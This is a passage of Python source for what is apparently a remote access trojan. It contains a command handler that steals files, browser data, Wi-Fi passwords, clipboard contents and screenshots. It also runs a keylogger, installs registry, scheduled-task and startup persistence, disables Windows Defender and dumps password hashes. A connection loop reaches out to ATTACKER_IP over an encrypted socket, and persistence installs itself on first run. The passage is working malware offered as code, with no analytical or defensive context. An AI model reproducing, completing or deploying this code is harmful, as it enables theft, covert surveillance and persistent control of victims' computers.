        send_encrypted(sock, "READY_FOR_UPLOAD")
        try:
            with open(fname, 'wb') as f:
                while True:
                    line = recv_encrypted(sock)
                    if line is None or line == "FILE_END":
                        break
                    f.write(base64.b64decode(line))
            send_encrypted(sock, f"[+] {fname} saved ({os.path.getsize(fname)} bytes)")
        except Exception as e:
            send_encrypted(sock, f"[-] Error: {e}")

    # --- Collection commands (return a file) ---
    elif cmd == "steal":
        result = steal_files()
        if os.path.exists(str(result)):
            send_encrypted(sock, "[+] Collecting user files...")
            send_file_over_socket(sock, result)
            safe_remove(result)
        else:
            send_encrypted(sock, str(result))
    elif cmd == "sysinfo":
        result = gather_sysinfo()
        if os.path.exists(str(result)):
            send_encrypted(sock, "[+] Gathering system information...")
            send_file_over_socket(sock, result)
            safe_remove(result)
        else:
            send_encrypted(sock, str(result))
    elif cmd == "screenshot":
        result = take_screenshot()
        if os.path.exists(str(result)):
            send_encrypted(sock, "[+] Capturing screen...")
            send_file_over_socket(sock, result)
            safe_remove(result)
        else:
            send_encrypted(sock, str(result))
    elif cmd == "browsers":
        result = steal_browsers()
        if os.path.exists(str(result)):
            send_encrypted(sock, "[+] Extracting browser data...")
            send_file_over_socket(sock, result)
            safe_remove(result)
        else:
            send_encrypted(sock, str(result))
    elif cmd == "exfil":
        result = full_exfil()
        if os.path.exists(str(result)):
            send_encrypted(sock, "[+] TOTAL exfiltration complete, sending...")
            send_file_over_socket(sock, result)
            safe_remove(result)
        else:
            send_encrypted(sock, str(result))

    # --- Information (text) ---
    elif cmd == "status":
        send_encrypted(sock, get_system_status())
    elif cmd == "wifi":
        send_encrypted(sock, get_wifi_passwords())
    elif cmd == "clipboard":
        send_encrypted(sock, get_clipboard())
    elif cmd == "software":
        send_encrypted(sock, get_installed_software())
    elif cmd == "privesc":
        send_encrypted(sock, check_privesc())

    # --- Persistence ---
    elif cmd == "persist" or cmd == "persist all":
        send_encrypted(sock, install_persistence("all"))
    elif cmd.startswith("persist "):
        sub = cmd[8:].strip()
        if sub == "check":
            send_encrypted(sock, check_persistence())
        elif sub == "remove":
            send_encrypted(sock, remove_persistence())
        elif sub in ("registry", "task", "startup"):
            send_encrypted(sock, install_persistence(sub))
        else:
            send_encrypted(sock, "[-] Usage: persist [all|registry|task|startup|check|remove]")

    # --- Keylogger ---
    elif cmd.startswith("keylog "):
        send_encrypted(sock, keylog_control(cmd[7:].strip()))
    elif cmd == "keylog":
        send_encrypted(sock, "[-] Usage: keylog start|stop|dump|clear")

    # --- Admin commands ---
    elif cmd == "disable_defender":
        send_encrypted(sock, disable_defender())
    elif cmd == "dump_hashes":
        send_encrypted(sock, dump_hashes())

    # --- Utilities ---
    elif cmd.startswith("alert "):
        send_encrypted(sock, show_alert(cmd[6:].strip()))
    elif cmd == "cleanup":
        send_encrypted(sock, cleanup())
    elif cmd.startswith("ps "):
        send_encrypted(sock, run_ps(cmd[3:].strip()))

    # --- Generic command (fallback to cmd) ---
    else:
        send_encrypted(sock, run_cmd(cmd))

    return True

# ===================== CONNECTION LOOP =====================

def connect_and_loop():
    """Infinite loop that connects to the listener, processes commands, and reconnects on failure."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_PORT))
            hostname = socket.gethostname()
            user = getpass.getuser()
            admin = "ADMIN" if is_admin() else "user"
            send_encrypted(s, f"[+] Connected: {user}@{hostname} ({admin}) in {os.getcwd()}")

            while True:
                cmd = recv_encrypted(s)
                if cmd is None:
                    break
                cmd = cmd.strip()
                if not cmd:
                    continue
                if not handle_command(s, cmd):
                    break

            s.close()
        except (socket.error, ConnectionRefusedError, ConnectionResetError):
            time.sleep(RECONNECT_DELAY)
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(RECONNECT_DELAY)

if __name__ == "__main__":
    # Automatically install persistence on first run
    if not os.path.exists(PERSIST_SCRIPT) or os.path.realpath(__file__) != os.path.realpath(PERSIST_SCRIPT):
        install_persistence()
    connect_and_loop()
